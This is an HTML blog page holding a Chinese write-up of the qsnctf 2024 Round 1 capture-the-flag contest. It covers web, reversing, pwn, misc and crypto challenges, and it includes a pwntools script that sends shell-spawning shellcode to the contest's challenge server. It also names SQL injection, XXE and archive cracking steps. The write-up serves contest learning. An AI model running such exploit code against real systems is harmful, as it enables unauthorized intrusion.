@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/null">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="D0G">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="菜的雅痞  WEBeasymd5fastcoll md5碰撞 生成两个md5后一样的文件，改为pdf上传  PHP的后门看 and 搜 一下PHP版本，全是  PHP的XXEdom.php中利用xxe  Easy_SQLiPOST的sql注入 保存数据包为1.txt  sqlmap梭  雏形系统dirsearch扫一下，发现www.zip 解混淆，base url 编码解一下，eval改为echo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="青少年ctf2024#Round_1">
+<meta property="og:url" content="https://blog.cgjue.cn/2024/03/04/qsnctf2024-Round-1/index.html">
+<meta property="og:site_name" content="云自无心水自闲">
+<meta property="og:description" content="菜的雅痞  WEBeasymd5fastcoll md5碰撞 生成两个md5后一样的文件，改为pdf上传  PHP的后门看 and 搜 一下PHP版本，全是  PHP的XXEdom.php中利用xxe  Easy_SQLiPOST的sql注入 保存数据包为1.txt  sqlmap梭  雏形系统dirsearch扫一下，发现www.zip 解混淆，base url 编码解一下，eval改为echo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.cgjue.cn/img/ctfer0.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
+<meta property="article:published_time" content="2024-03-04T10:10:24.000Z">
+<meta property="article:modified_time" content="2024-03-07T10:47:30.174Z">
+<meta property="article:author" content="D0G">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.cgjue.cn/img/ctfer0.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>青少年ctf2024#Round_1 - 云自无心水自闲</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.cgjue.cn","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":66,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":100},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="云自无心水自闲" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👻云自无心水自闲</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>朋友们</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default2.png#%E6%96%87%E7%AB%A0%E9%A1%B6%E9%83%A8') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="青少年ctf2024#Round_1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-04 18:10" pubdate>
+          2024年3月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">青少年ctf2024#Round_1</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年3月7日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>菜的雅痞</p>
+<p><img src="/img/image-20240304181302050.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><p><strong>fastcoll md5碰撞 生成两个md5后一样的文件，改为pdf上传</strong></p>
+<p><img src="/img/image-20240304181356526.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="PHP的后门"><a href="#PHP的后门" class="headerlink" title="PHP的后门"></a>PHP的后门</h2><p>看 and 搜 一下PHP版本，全是</p>
+<p><img src="/img/image-20240304181436426.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="PHP的XXE"><a href="#PHP的XXE" class="headerlink" title="PHP的XXE"></a>PHP的XXE</h2><p>dom.php中利用xxe</p>
+<p><img src="/img/image-20240304181450963.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h2><p>POST的sql注入</p>
+<p>保存数据包为1.txt</p>
+<p><img src="/img/image-20240304181508848.png" srcset="/img/loading.gif" lazyload></p>
+<p>sqlmap梭</p>
+<p><img src="/img/image-20240304181541657.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="雏形系统"><a href="#雏形系统" class="headerlink" title="雏形系统"></a>雏形系统</h2><p>dirsearch扫一下，发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>解混淆，base url 编码解一下，eval改为echo输出原内容</p>
+<p>反序列化</p>
+<p><img src="/img/6b556b2f-460f-4aaa-b63a-3b483d1b9d15.png" srcset="/img/loading.gif" lazyload></p>
+<p>传参</p>
+<p><img src="/img/image-20240304181806873.png" srcset="/img/loading.gif" lazyload alt="image-20240304181806873"></p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="来打CS咯"><a href="#来打CS咯" class="headerlink" title="来打CS咯"></a>来打CS咯</h2><p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/1f795a15191a4e19d32f4be3011beb6e718f2e62fe01dffebdd715424abd2f13">https://s.threatbook.com/report/file/1f795a15191a4e19d32f4be3011beb6e718f2e62fe01dffebdd715424abd2f13</a></p>
+<p>云沙箱运行一下得到IP</p>
+<p><img src="/img/image-20240304181823770.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="简单的数学题"><a href="#简单的数学题" class="headerlink" title="简单的数学题"></a>简单的数学题</h2><p>三道计算题</p>
+<p><a target="_blank" rel="noopener" href="https://zs.symbolab.com/solver">https://zs.symbolab.com/solver</a></p>
+<p>前两道随便找个在线网站一键计算，最后的数有点大，使用sagemath进行计算即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>x = SR.var(<span class="hljs-string">&#x27;x&#x27;</span>)<br><br>f = x**<span class="hljs-number">10</span> + <span class="hljs-number">2</span>**<span class="hljs-number">10</span> - <span class="hljs-number">4</span>*x - <span class="hljs-number">6131066258749</span><br><br>sol = find_root(f, <span class="hljs-number">0</span>, <span class="hljs-number">100000</span>)  <br><span class="hljs-built_in">print</span>(sol)<br></code></pre></td></tr></table></figure>
+
+<h2 id="Easy-Shellcode"><a href="#Easy-Shellcode" class="headerlink" title="Easy_Shellcode"></a>Easy_Shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;Linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level =<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="hljs-number">31862</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># libc = cdll.LoadLibrary(&#x27;libc.so.6&#x27;) </span><br><span class="hljs-comment"># libc.srand(1) #设置种子</span><br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>rcv = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>it = <span class="hljs-keyword">lambda</span> : p.interactive()<br>d = <span class="hljs-keyword">lambda</span> :gdb.attach(p)<br>b = <span class="hljs-keyword">lambda</span> :pause()<br><br>buf = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(buf)<br>shellcode = asm(shellcraft.sh())<br><br>payload = shellcode.ljust(<span class="hljs-number">0x108</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p64(buf)<br><br><span class="hljs-comment"># d()</span><br><span class="hljs-comment"># b()</span><br>sl(payload)<br><br><br>it()<br></code></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CTFer-Revenge"><a href="#CTFer-Revenge" class="headerlink" title="CTFer Revenge"></a>CTFer Revenge</h2><p>发现RAR文件的文件头，猜测是逆置的，编写代码反转回去</p>
+<p><img src="/img/image-20240304181840401.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 读取文本文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;11.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.read()<br><br><span class="hljs-comment"># 使用splitlines()方法将文本分割成行列表</span><br>lines_list = lines.splitlines()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_between_pipes</span>(<span class="hljs-params">line</span>):<br>    <span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">r&#x27;(\|.+\|)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, line)<br><br>new_lines_list = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines_list:<br>    new_line = line[:-<span class="hljs-number">8</span>]<br>    new_line = remove_between_pipes(new_line)<br>    new_lines_list.append(<span class="hljs-string">&#x27; &#x27;</span>.join(new_line.split(<span class="hljs-string">&#x27;\n&#x27;</span>)))<br><br><br><br><span class="hljs-comment"># 将结果写入新的文本文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;114.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>    <span class="hljs-keyword">for</span> new_line <span class="hljs-keyword">in</span> new_lines_list:<br>        new_file.write(new_line.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;114.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.read()<br>    new_lines_list = lines[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;114.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>    <span class="hljs-keyword">for</span> new_line <span class="hljs-keyword">in</span> new_lines_list:<br>        new_file.write(new_line.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>010导入16进制文件即可，保存成RAR</p>
+<p><img src="/img/image-20240304181855632.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后用ARCHPR通过提示爆破密码</p>
+<p><img src="/img/image-20240304181905384.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/image-20240304181912824.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-model"><a href="#ez-model" class="headerlink" title="ez_model"></a>ez_model</h2><p>网上搜索脚本，直接查看模型数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> torch<br><br>pthfile = <span class="hljs-string">r&#x27;./easy.pth&#x27;</span>  <span class="hljs-comment"># .pth文件的路径</span><br>model = torch.load(pthfile, torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>))  <span class="hljs-comment"># 设置在cpu环境下查询</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;type:&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(model))  <span class="hljs-comment"># 查看模型字典长度</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;length:&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(model))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:&#x27;</span>)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> model.keys():  <span class="hljs-comment"># 查看模型字典里面的key</span><br>    <span class="hljs-built_in">print</span>(k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;value:&#x27;</span>)<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> model:  <span class="hljs-comment"># 查看模型字典里面的value</span><br>    <span class="hljs-built_in">print</span>(k, model[k])<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20240304182024110.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过两次解码，猜测是变表的base64</p>
+<p><img src="/img/image-20240304182059239.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="追光者"><a href="#追光者" class="headerlink" title="追光者"></a>追光者</h2><p>bandizip修复一下压缩包</p>
+<p>发现</p>
+<p><img src="/img/image-20240304182114223.png" srcset="/img/loading.gif" lazyload></p>
+<p>binwalk分离追光者.jpg发现一个压缩包</p>
+<p><img src="/img/image-20240304182138017.png" srcset="/img/loading.gif" lazyload></p>
+<p>注释算是提示吧 :(&#x3D;</p>
+<p>从追光者.jpg中发现密码（别抽象了哥，求你了）</p>
+<p><img src="/img/image-20240304182153591.png" srcset="/img/loading.gif" lazyload></p>
+<p>txt中部分flag</p>
+<p>解压发现可以利用明文攻击,拿到另一部分flag文件，逆序一下</p>
+<p><img src="/img/image-20240304182206982.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="多情"><a href="#多情" class="headerlink" title="多情"></a>多情</h2><p>分离出一张图片，看文字提示修改宽高发现996</p>
+<p>转二进制排序文本中的内容</p>
+<p><img src="/img/image-20240304182217742.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="小光的答案之书"><a href="#小光的答案之书" class="headerlink" title="小光的答案之书"></a>小光的答案之书</h2><p>圣堂武士密码，life</p>
+<p>关注公众号，拿flag</p>
+<p><img src="/img/image-20240304182251334.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>qsnctf{青少年CTF蒸蒸日上}</p>
+<p>没抽到奖，难受</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="解个方程"><a href="#解个方程" class="headerlink" title="解个方程"></a>解个方程</h2><p><img src="/img/image-20240304182309783.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ez-log"><a href="#ez-log" class="headerlink" title="ez_log"></a>ez_log</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Luiino/article/details/126117985">https://blog.csdn.net/Luiino/article/details/126117985</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/">https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/</a></p>
+<p>离散对数</p>
+<p> 利用sympy库中的discrete_log(x,y,z)函数可求解，x:模数，y:余数，z:底数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> binascii<br><br>m = <span class="hljs-number">3</span><br>c = <span class="hljs-number">2755382540415579102071064701464875587397358450731640269892589311709262533380944401636001606033435395119029405853044523473152024882723244640973125106544997919867124733729051371170794687714291</span><br>n = <span class="hljs-number">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span><br><br>flag = sympy.discrete_log(n, c, m)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure>
+
+<h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p><img src="/img/image-20240304182324536.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿到d和r</p>
+<p>用r做n，直接解rsa</p>
+<p><img src="/img/image-20240304182338103.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="四重加密"><a href="#四重加密" class="headerlink" title="四重加密"></a>四重加密</h2><p>压缩包注释 base64 拿到密码 qsnctf</p>
+<p>html转换</p>
+<p><img src="/img/image-20240304182350510.png" srcset="/img/loading.gif" lazyload></p>
+<p>维吉尼亚然后rot13</p>
+<p>flag{ldvgosdabv_kfkjc_jcvsbdi}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/13/Beautify-Shell/" title="终端美化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">终端美化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/04/nepctf-2023/" title="nepctf-2023">
+                        <span class="hidden-mobile">nepctf-2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
